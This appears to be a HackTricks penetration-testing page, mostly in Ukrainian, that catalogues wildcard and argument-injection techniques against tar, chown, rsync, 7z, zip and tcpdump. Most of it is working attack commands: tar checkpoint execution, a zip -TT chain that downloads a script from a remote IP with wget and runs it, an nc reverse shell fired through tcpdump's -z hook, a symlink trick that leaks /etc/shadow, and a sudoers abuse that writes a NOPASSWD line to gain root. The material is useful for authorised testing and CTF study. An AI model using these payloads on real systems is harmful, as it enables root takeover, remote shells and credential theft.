# Wildcards — запасні хитрощі

{{#include ../../banners/hacktricks-training.md}}

> Wildcard (aka *glob*) **argument injection** відбувається, коли привілейований скрипт запускає Unix-бінарник, такий як `tar`, `chown`, `rsync`, `zip`, `7z`, … з невзятою в лапки wildcard, наприклад `*`.
> Оскільки shell розгортає wildcard **before** виконання бінарника, атакуючий, який може створювати файли в робочій директорії, може створити імена файлів, що починаються з `-`, так що вони інтерпретуються як **options instead of data**, ефективно контрабандуючи довільні прапорці або навіть команди.
> Ця сторінка збирає найкорисніші примітиви, останні дослідження та сучасні методи виявлення на 2023–2025 роки.

## chown / chmod

Ви можете **скопіювати власника/групу або біти прав доступу з довільного файлу**, зловживаючи прапорцем `--reference`:
```bash
# attacker-controlled directory
touch "--reference=/root/secret``file"   # ← filename becomes an argument
```
Коли root пізніше виконає щось на кшталт:
```bash
chown -R alice:alice *.php
chmod -R 644 *.php
```
`--reference=/root/secret``file` впроваджується, спричиняючи, що *всі* відповідні файли успадковують власника/права доступу від `/root/secret``file`.

*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (комбінована атака).
Також дивіться класичну статтю DefenseCode для подробиць.

---

## tar

### GNU tar (Linux, *BSD, busybox-full)

Виконайте довільні команди, зловживаючи функцією **checkpoint**:
```bash
# attacker-controlled directory
echo 'echo pwned > /tmp/pwn' > shell.sh
chmod +x shell.sh
touch "--checkpoint=1"
touch "--checkpoint-action=exec=sh shell.sh"
```
Коли root запускає, наприклад, `tar -czf /root/backup.tgz *`, `shell.sh` виконається з привілеями root.

### bsdtar / macOS 14+

Стандартний `tar` у останніх версіях macOS (на основі `libarchive`) *не* реалізує `--checkpoint`, але ви все одно можете досягти виконання коду за допомогою опції **--use-compress-program**, яка дозволяє вказати зовнішній компресор.
```bash
# macOS example
touch "--use-compress-program=/bin/sh"
```
Коли привілейований скрипт запускає `tar -cf backup.tar *`, `/bin/sh` буде запущено.

---

## rsync

`rsync` дозволяє перевизначити remote shell або навіть remote binary за допомогою параметрів командного рядка, що починаються з `-e` або `--rsync-path`:
```bash
# attacker-controlled directory
touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
```
Якщо root пізніше архівує каталог за допомогою `rsync -az * backup:/srv/`, вставлений flag запускає ваш shell на віддаленій стороні.

*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` mode).

---

## 7-Zip / 7z / 7za

Навіть коли привілейований скрипт *defensively* префіксує wildcard `--` (щоб припинити парсинг опцій), формат 7-Zip підтримує **file list files** шляхом префіксації імені файлу `@`. Поєднання цього з symlink дозволяє вам *exfiltrate arbitrary files*:
```bash
# directory writable by low-priv user
cd /path/controlled
ln -s /etc/shadow   root.txt      # file we want to read
touch @root.txt                  # tells 7z to use root.txt as file list
```
Якщо root виконує щось на зразок:
```bash
7za a /backup/`date +%F`.7z -t7z -snl -- *
```
7-Zip спробує прочитати `root.txt` (→ `/etc/shadow`) як список файлів і завершить роботу, **вивівши вміст у stderr**.

---

## zip

Існують два дуже практичні примітиви, коли застосунок передає підконтрольні користувачеві імена файлів до `zip` (або через wildcard, або перераховуючи імена без `--`).

- RCE via test hook: `-T` enables “test archive” and `-TT <cmd>` replaces the tester with an arbitrary program (long form: `--unzip-command <cmd>`). If you can inject filenames that start with `-`, split the flags across distinct filenames so short-options parsing works:
```bash
# Attacker-controlled filenames (e.g., in an upload directory)
# 1) A file literally named: -T
# 2) A file named: -TT wget 10.10.14.17 -O s.sh; bash s.sh; echo x
# 3) Any benign file to include (e.g., data.pcap)
# When the privileged code runs: zip out.zip <files...>
# zip will execute: wget 10.10.14.17 -O s.sh; bash s.sh; echo x
```
Примітки
- Не намагайтеся використовувати одне ім'я файлу на кшталт `'-T -TT <cmd>'` — короткі опції розбираються по символах, і це не спрацює. Використовуйте окремі токени, як показано.
- Якщо додаток видаляє косі риски зі шляхів/імен файлів, завантажте з голого хоста/IP (шлях за замовчуванням `/index.html`) і збережіть локально за допомогою `-O`, а потім виконайте.
- Ви можете налагодити розбір за допомогою `-sc` (показати оброблений argv) або `-h2` (додаткова довідка), щоб зрозуміти, як обробляються ваші токени.

Приклад (локальна поведінка в zip 3.0):
```bash
zip test.zip -T '-TT wget 10.10.14.17/shell.sh' test.pcap    # fails to parse
zip test.zip -T '-TT wget 10.10.14.17 -O s.sh; bash s.sh' test.pcap  # runs wget + bash
```
- Екзфільтрація даних/leak: Якщо веб‑шар віддзеркалює stdout/stderr від `zip` (поширено у наївних обгорток), інжектовані прапорці, як-от `--help`, або помилки через некоректні опції з’являться в HTTP‑відповіді, що підтвердить command-line injection і допоможе налаштувати payload.

---

## Додаткові бінарні файли, вразливі до wildcard injection (швидкий список 2023–2025)

The following commands have been abused in modern CTFs and real environments.  The payload is always created as a *filename* inside a writable directory that will later be processed with a wildcard:

| Бінарний файл | Прапор для зловживання | Ефект |
| --- | --- | --- |
| `bsdtar` | `--newer-mtime=@<epoch>` → arbitrary `@file` | Читання вмісту файлу |
| `flock` | `-c <cmd>` | Виконання команди |
| `git`   | `-c core.sshCommand=<cmd>` | Command execution via git over SSH |
| `scp`   | `-S <cmd>` | Запуск довільної програми замість ssh |

These primitives are less common than the *tar/rsync/zip* classics but worth checking when hunting.

---

## tcpdump rotation hooks (-G/-W/-z): RCE via argv injection in wrappers

When a restricted shell or vendor wrapper builds a `tcpdump` command line by concatenating user-controlled fields (e.g., a "file name" parameter) without strict quoting/validation, you can smuggle extra `tcpdump` flags. The combo of `-G` (time-based rotation), `-W` (limit number of files), and `-z <cmd>` (post-rotate command) yields arbitrary command execution as the user running tcpdump (often root on appliances).

Передумови:

- Ви можете впливати на `argv`, переданий `tcpdump` (наприклад, через wrapper як `/debug/tcpdump --filter=... --file-name=<HERE>`).
- Wrapper не фільтрує пробіли або токени, що починаються з `-`, у полі імені файлу.

Класичний PoC (виконує reverse shell скрипт із директорії з правом запису):
```sh
# Reverse shell payload saved on the device (e.g., USB, tmpfs)
cat > /mnt/disk1_1/rce.sh <<'EOF'
#!/bin/sh
rm -f /tmp/f; mknod /tmp/f p; cat /tmp/f|/bin/sh -i 2>&1|nc 192.0.2.10 4444 >/tmp/f
EOF
chmod +x /mnt/disk1_1/rce.sh

# Inject additional tcpdump flags via the unsafe "file name" field
/debug/tcpdump --filter="udp port 1234" \
--file-name="test -i any -W 1 -G 1 -z /mnt/disk1_1/rce.sh"

# On the attacker host
nc -6 -lvnp 4444 &
# Then send any packet that matches the BPF to force a rotation
printf x | nc -u -6 [victim_ipv6] 1234
```
Деталі:

- `-G 1 -W 1` примушує негайну ротацію після першого пакета, що відповідає умові.
- `-z <cmd>` запускає post-rotate команду один раз на ротацію. Багато збірок виконують `<cmd> <savefile>`. Якщо `<cmd>` — скрипт/інтерпретатор, переконайтеся, що обробка аргументів відповідає вашому payload.

Варіанти без знімних носіїв:

- Якщо у вас є будь-яка інша примітива для запису файлів (наприклад, окремий command wrapper, який дозволяє перенаправлення виводу), помістіть свій скрипт у відомий шлях і викличте `-z /bin/sh /path/script.sh` або `-z /path/script.sh` залежно від семантики платформи.
- Деякі vendor wrappers роблять ротацію в місця, керовані атакуючим. Якщо ви можете вплинути на шлях ротації (symlink/directory traversal), ви можете направити `-z` на виконання вмісту, який ви повністю контролюєте без зовнішніх носіїв.

---

## sudoers: tcpdump with wildcards/additional args → arbitrary write/read and root

Дуже поширена помилка конфігурації sudoers:
```text
(ALL : ALL) NOPASSWD: /usr/bin/tcpdump -c10 -w/var/cache/captures/*/<GUID-PATTERN> -F/var/cache/captures/filter.<GUID-PATTERN>
```
Проблеми
- `*` glob та дозволяючі шаблони обмежують лише перший аргумент `-w`. `tcpdump` приймає декілька опцій `-w`; остання перезаписує попередні.
- Правило не фіксує інші опції, тому `-Z`, `-r`, `-V` тощо дозволені.

Примітиви
- Перезаписати шлях призначення другим `-w` (перший лише задовольняє sudoers):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ \
-w /dev/shm/out.pcap \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Path traversal всередині першого `-w` для виходу з обмеженого дерева:
```bash
sudo tcpdump -c10 \
-w/var/cache/captures/a/../../../../dev/shm/out \
-F/var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Примусово встановити власника виводу за допомогою `-Z root` (створює root-owned файли будь-де):
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-w /dev/shm/root-owned \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
- Запис довільного вмісту шляхом відтворення створеного PCAP через `-r` (наприклад, щоб додати рядок у sudoers):

<details>
<summary>Створіть PCAP, що містить точний ASCII payload і запишіть його від імені root</summary>
```bash
# On attacker box: craft a UDP packet stream that carries the target line
printf '\n\nfritz ALL=(ALL:ALL) NOPASSWD: ALL\n' > sudoers
sudo tcpdump -w sudoers.pcap -c10 -i lo -A udp port 9001 &
cat sudoers | nc -u 127.0.0.1 9001; kill %1

# On victim (sudoers rule allows tcpdump as above)
sudo tcpdump -c10 -w/var/cache/captures/a/ -Z root \
-r sudoers.pcap -w /etc/sudoers.d/1111-aaaa \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
</details>

- Довільне читання файлу/витік секрету (leak) з `-V <file>` (інтерпретує список файлів збереження). Діагностика помилок часто виводить рядки, leaking content:
```bash
sudo tcpdump -c10 -w/var/cache/captures/a/ -V /root/root.txt \
-w /tmp/dummy \
-F /var/cache/captures/filter.aaaaaaaa-aaaa-aaaa-aaaa-aaaaaaaaaaaa
```
---

## Джерела

- [GTFOBins - tcpdump](https://gtfobins.github.io/gtfobins/tcpdump/)
- [GTFOBins - zip](https://gtfobins.github.io/gtfobins/zip/)
- [0xdf - HTB Dump: Zip arg injection to RCE + tcpdump sudo misconfig privesc](https://0xdf.gitlab.io/2025/11/04/htb-dump.html)
- [FiberGateway GR241AG - Full Exploit Chain](https://r0ny.net/FiberGateway-GR241AG-Full-Exploit-Chain/)

{{#include ../../banners/hacktricks-training.md}}
